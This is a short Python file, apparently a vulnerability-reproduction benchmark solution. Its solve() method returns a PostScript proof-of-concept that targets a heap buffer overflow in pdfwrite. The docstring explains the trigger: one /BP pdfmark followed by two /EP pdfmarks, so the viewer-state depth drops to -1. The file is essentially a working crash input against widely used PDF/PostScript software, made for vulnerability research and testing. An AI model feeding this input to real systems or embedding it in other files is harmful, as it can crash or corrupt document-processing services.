import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in pdfwrite.
        
        The vulnerability allows the viewer state restore operation (triggered by /EP)
        to proceed even when the viewer depth is 0, leading to a stack underflow/overflow.
        
        We construct a PostScript file that:
        1. Pushes a viewer state using /BP (Begin Article) to ensure stack initialization.
        2. Pops the state using /EP (End Article).
        3. Pops again using /EP, triggering the vulnerability (depth becomes -1).
        """
        return b"%!PS\n[ /Title (PoC) /Rect [0 0 100 100] /BP pdfmark\n[ /EP pdfmark\n[ /EP pdfmark\n"
